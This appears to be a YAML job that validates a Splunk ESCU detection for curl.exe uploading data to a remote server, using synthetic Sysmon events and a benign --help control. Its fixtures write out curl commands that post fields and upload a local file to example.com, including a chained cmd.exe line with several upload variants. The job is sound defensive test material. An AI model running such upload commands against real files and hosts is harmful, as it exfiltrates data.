type: job
name: Windows Curl Upload to Remote Destination
detection:
  source: escu
  name: "ESCU - Windows Curl Upload to Remote Destination - Rule"
  id: 42f8f1a2-4228-11ec-aade-acde48001122
description: |
  Validates detection of curl.exe sending data to a remote web server.
  Sysmon EID 1 (Process Create) records C:\Windows\System32\Curl.exe
  started from cmd.exe with -d to post form fields, for example
  name=admin and shoesize=12, or with -T to upload a local file, for
  example a text file under c:\temp. A benign control models curl.exe
  started with --help, which prints its usage and sends nothing. The
  events record the launch and its arguments, not whether the transfer
  succeeded.
mitre:
  tactics: [command-and-control]
  techniques: [T1105]

state:
  domain_short:        CORP
  domain_tld:          local
  domain_short_lower:  fn.lower(ref.domain_short)
  domain_fqdn:         "${ref.domain_short_lower}.${ref.domain_tld}"
  computer:            gen.hostname(class=windows-server, domain=ref.domain_fqdn)
  # All three launches share one host, so their record IDs come from
  # disjoint ranges to keep the per-event correlation keys distinct.
  post_record_id:      gen.int(min=5000, max=39999)
  upload_record_id:    gen.int(min=40000, max=69999)
  control_record_id:   gen.int(min=70000, max=99999)
  user_short_name:     ADMINI~1

  post_command_line:   'curl  -d name=admin -d shoesize=12 http://example.com/'
  upload_command_line: 'C:\Windows\System32\Curl.exe  -T c:\temp\atomictestfile.txt www.example.com '
  upload_directory:    'C:\Users\${ref.user_short_name}\AppData\Local\Temp\2\'
  upload_parent:       '"C:\Windows\system32\cmd.exe" /c "echo "This is an Atomic Test File" c:\temp\atomictestfile.txt & C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com" '
  help_command_line:   'curl  --help'

workloads:
  - scenario: scenarios/windows/sysmon/process-create/curl-upload-to-remote-host
    bindings:
      domain_short:    ref.domain_short
      domain_tld:      ref.domain_tld
      computer:        ref.computer
      event_record_id: ref.post_record_id
      command_line:    ref.post_command_line
    expectation:
      expected: alert
      summary: "curl.exe posts form fields to a remote web server with -d"

  - scenario: scenarios/windows/sysmon/process-create/curl-upload-to-remote-host
    bindings:
      domain_short:        ref.domain_short
      domain_tld:          ref.domain_tld
      computer:            ref.computer
      event_record_id:     ref.upload_record_id
      command_line:        ref.upload_command_line
      current_directory:   ref.upload_directory
      parent_command_line: ref.upload_parent
    expectation:
      expected: alert
      summary: "curl.exe uploads a local file to a remote web server with -T"

  - scenario: scenarios/windows/sysmon/process-create/curl-upload-to-remote-host
    bindings:
      domain_short:    ref.domain_short
      domain_tld:      ref.domain_tld
      computer:        ref.computer
      event_record_id: ref.control_record_id
      command_line:    ref.help_command_line
    expectation:
      expected: none
      summary: "curl.exe prints its usage with --help and sends nothing"
